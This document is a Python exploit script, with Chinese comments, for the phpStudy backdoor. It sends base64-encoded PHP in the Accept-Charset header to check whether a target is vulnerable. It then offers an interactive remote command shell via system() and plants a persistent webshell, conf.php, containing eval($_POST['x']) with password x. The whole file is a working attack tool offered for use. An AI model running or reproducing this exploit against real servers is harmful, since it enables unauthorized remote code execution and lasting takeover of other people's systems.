#!/user/bin/env python3
# -*- coding: utf-8 -*-

import base64
import requests
import argparse
import sys
import re

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}


# 帮助
def cmd_line():
    parse = argparse.ArgumentParser(
        description="PHPstudy RCE POC & EXP",  # 描述
        usage="python phpstudy_rce.py -u [url] --shell",  # 使用方法
        add_help=True  # 开启帮助
    )

    parse.add_argument('-u', '--url', help="指定目标url地址")
    parse.add_argument('--shell', help="利用漏洞并获取命令行", action='store_true')
    parse.add_argument('--webshell', help="利用漏洞并上传webshell", action='store_true')
    parse.add_argument('-p', '--proxy', help="设置代理，如socks5://127.0.0.1:7890")

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    return parse.parse_args()


# 漏洞检测
def checkPhpstudyBackdoor(tgtUrl, timeout, proxys=None):
    headers['Accept-Charset'] = 'ZXhpdCgnMTExN2JlZTVhNGZmZDEwMWExODYyNDAzMWQ3ODcxNmYnKTs='
    try:
        rsp = requests.get(tgtUrl, headers=headers, verify=False, timeout=timeout, proxies={
            'http': proxys,
            'https': proxys
        })

        if "1117bee5a4ffd101a18624031d78716f" in rsp.text:
            return True
    except:
        return False


# 利用漏洞获取shell
def getCmdShellPhpstudyBackdoor(tgtUrl, timeout, proxys):
    while True:
        command = input('cmd>>> ')
        if command == 'exit':
            break
        if command == '':
            continue

        command = "system(\'chcp 65001&&" + command + "\');"

        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        cmdResult = requests.get(tgtUrl, headers=headers, verify=False, timeout=7, proxies={
            'http': proxys,
            'https': proxys
        })
        pattern = re.compile(r"(.*?)<html><meta charset='utf-8'/>", re.S)
        results = re.findall(pattern, cmdResult.text)[0]
        print(str(results).lstrip('Active code page: 65001\r\n'), end='')



# 上传webshell
def phpstudyWebshell(tgtUrl, timeout, proxys):
    try:
        command = "phpinfo();"

        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        phpinfoResult = requests.get(tgtUrl, headers=headers, verify=False, timeout=7, proxies={
            'http': proxys,
            'https': proxys
        })
        pattern = re.compile(r'<tr><td class=\"e\">_SERVER\[\"DOCUMENT_ROOT\"\]</td><td class=\"v\">(.*?)</td></tr>',
                             re.S)
        document_result = re.findall(pattern, str(phpinfoResult.text))[0]
        print("\033[32m[✅]获取到网站路径 " + document_result + '\033[0m')
    except:
        document_result = input("[!]获取路径失败！请手动输入网站目录可写路径 :")

    exp = 'file_put_contents(\'' + str(
        document_result) + '/conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\'));'
    b64exp = base64.b64encode(exp.encode('utf-8'))
    headers['Accept-Charset'] = b64exp
    try:
        rsp = requests.get(tgtUrl, headers=headers, verify=False, timeout=timeout, proxies={
            'http': proxys,
            'https': proxys
        })
    except:
        print("[!]写入webshell失败！")
        exit(0)
    # print(rsp.status_code)
    if rsp.status_code == 200:
        try:
            rsp1 = requests.get(tgtUrl + '/conf.php', verify=False, timeout=timeout, proxies={
                'http': proxys,
                'https': proxys
            })
            if rsp1.status_code == 200:
                print('\033[32m[✅]写入webshell成功 ' + tgtUrl + 'conf.php 连接密码 x\033[0m')
        except:
            print("[!]访问webshell失败")


def main():
    args = cmd_line()
    target_url = args.url
    if args.proxy is not None:
        proxys = args.proxy
    else:
        proxys = None
    if target_url is not None:
        poc_result = checkPhpstudyBackdoor(target_url, 10, proxys)
    if poc_result:
        print("\033[32m[✅]存在漏洞\033[0m")
        if args.shell:
            getCmdShellPhpstudyBackdoor(target_url, 10, proxys)
        if args.webshell:
            phpstudyWebshell(target_url, 10, proxys)
    else:
        print("[!]漏洞不存在或连接错误！")


if __name__ == '__main__':
    main()
